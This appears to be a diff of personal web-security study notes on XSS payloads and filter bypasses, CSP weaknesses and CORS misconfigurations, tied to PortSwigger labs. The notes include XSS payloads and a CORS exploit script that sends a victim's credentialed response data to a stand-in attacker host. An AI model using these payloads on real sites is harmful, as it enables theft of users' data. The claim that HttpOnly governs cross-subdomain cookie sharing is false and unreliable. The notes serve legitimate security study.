@@ -7,15 +7,22 @@ XSS types
     3. DOM: search for eval
     4. Blind : XSS hunter express
 
+
+
 ### Reflected or Stored XSS 
-
-
+- First do the spider or  katana to do  crawling
+- XSS on Wordpress
+- Check this everywhere in every input or anything having params or lin: `<img src=0 onerror='alert(1)'>`
+- encode URL encode/base64 once or twice for the payload upto 5 times
+- payload file use fuzzing to find xss
+- check CSP if it allows it
 - Install dom invader in burp
 - We don't have to close the tag properly, html will still parse it.
 - `<script>` are prioritised to break out of string under js context
 - If space is blocked in js then we can use `/**/` which is basically comment
 - Check for what are all things that are escaped and what are not excaped
-  - `'"</\->` or `/["'\\`]/g, '\\$&()=`
+  - `'"</\->` or `/["'\\`]/g, '\\$&()=<>`
+
 - Advance concept:
   - `throw onerror=alert,123` : `throw` only returns the last argument and onerror is the handler assigned with alert, and also throw itself triggers onerror function which in turns execute alert(123)
   - `x=x=>{}` is a function with one argument
@@ -27,11 +34,12 @@ XSS types
         console.log(f(2,4,x=5));
         ```
         You can see that extra argument(any number of arguments) are ignored and can be given expression which is evaluated.
+  - Ref: https://portswigger.net/research/xss-without-parentheses-and-semi-colons
   - in `href`, anything after `javascript` is js code
   - Browser parses  HTML tags and attributes within a response, then it perform HTML-decoding of tag attribute values before they are processed any further.So if thes tag attribute contains js code, it is then decoded and the further processing is done. If the server side blocks or sanitises certain characters, then it can be bypassed using html encoding of those characters.
     - `<a href="#" onclick="... var input='<payload>'; ...">`
     - `&apos;-alert(document.domain)-&apos;` as `'` is encoded as `&apos;`
-  - Template literals are encapsulated in backticks  instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax. 
+  - Template literals ==  <backquote> : are encapsulated in backticks  instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax. 
     -   ```
         document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
         ```
@@ -213,6 +221,77 @@ TO read:
 
 
 
+#### CSP
+CSP for directive with random hash that tells to execute only if the script contains that nonce.
+Also it refers to the source where js can be executed like `self`
+
+- CSP does not completly prevent XSS
+- `unsafe inline` in CSP is vulnerable
+- CSP bypass for XSS. 
+- any `unsafe` is actually unsafe
+
+
+#### CORS:
+Cross origin resource: It tells what resource to access depending upon the header and origin provided. 
+- Shodan can be used to check ACAO or other very easily. Query : `"Access-Control-Allow-Origin: null"`
+- URL 'Origin: http://example.com`.hackxor.net/'(safari) is parses as Origin: http://example.com or 'Origin: http://example.com_hackxor.net/' (firefox or chrome)
+- Checking if all subdomain are whitelisted `Access-Control-Allow-Origin: *.example.com`
+- checking the protocol restriction: 
+If a website is accessed over HTTPS but will happily accept CORS interactions from http://wherever, someone performing an active man-in-the-middle (MITM) attack can pretty much bypass its use of HTTPS entirely. ![CORS Protocol Relaxation Vulnerability](images/cors-protocol.png)
+
+
+`
+Access-Control-Allow-Origin: https://foo.example # what resource are allowed
+Access-Control-Allow-Methods: POST, GET, OPTIONS # What methods are allowed
+Access-Control-Allow-Headers: X-PINGOTHER, Content-Type # 
+Access-Control-Allow-credentials: true # allow cookies
+`
+- Access-Control-Allow-Origin: Specifies which origins are allowed to access the resource. For example, https://foo.example allows requests only from that domain, preventing access from unauthorized origins.
+
+- Access-Control-Allow-Methods: Defines the HTTP methods (e.g., POST, GET, OPTIONS) permitted in cross-origin requests. This ensures that only approved methods can be used when interacting with the resource.
+
+- Access-Control-Allow-Headers: Lists the custom headers (e.g., X-PINGOTHER, Content-Type) that the client is allowed to send in cross-origin requests. This ensures compatibility with server expectations.
+
+- Access-Control-Allow-credentials: Indicates whether the resource allows sending credentials (e.g., cookies) in cross-origin requests. This is often used for authentication purposes. When set to false, cookie or csrf token cannot be stolen
+  
+
+
+- SOP (Same Origin Policy): has 3 parts: protocol + domain + port.
+- Check using different value of `origin` and different protocol like `http(s)` in request header to see if we get ACAO
+- dynamic gereration of ACAO using wildcard
+  * Some origin starts with is vulnerable https://btc.net.evil.net
+  * some origin ends with is also vulnerable 
+    * https://*zomato.com is vulnerable as https://notzomto.com can be used
+  * Null origin is also vulnerable
+    * `ACAO: null`, `ACAC: true` is very dangerous
+    * iframe has sandbox when used gives origin null which has ACAO set to null
+    * null origin is same as `*` and more dangerous as `*`
+      * `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>*cors stuff here*</script>’></iframe>`
+  
+  * with origin as `*` or `null`, ACAC is not applicable hence set to false automatically, also the website has to do setup of ACAO with wildcard or something and that is the reason that it is dynamically generated
+  * `*.mysite.com` (all subdomain) in ACAO is also vulnerable if any of your subdomain is vulnerable
+  * Indication where dynamic header is used is to check if the origin is not given in request but AC headers are there in response and
+  * ACAO is not sent in response by most of server when origin is not given in request
+  * `ACAC` is false by default
+- Developer gold
+  - Specifiying this static header call `Vary:Origin` if dynamic header are used
+  - Even w3 sites do not have this header. haha
+  - cache poisioning: client side
+- `HttpOnly` flag is responisble for sharing cookies across all subdomain of a domain.
+- Payload for victim
+  ```
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='//malicious-website.com/log?key='+this.responseText;
+    };
+  ```
+  resolve this lab: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack 
+- Ref: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
 
 
 
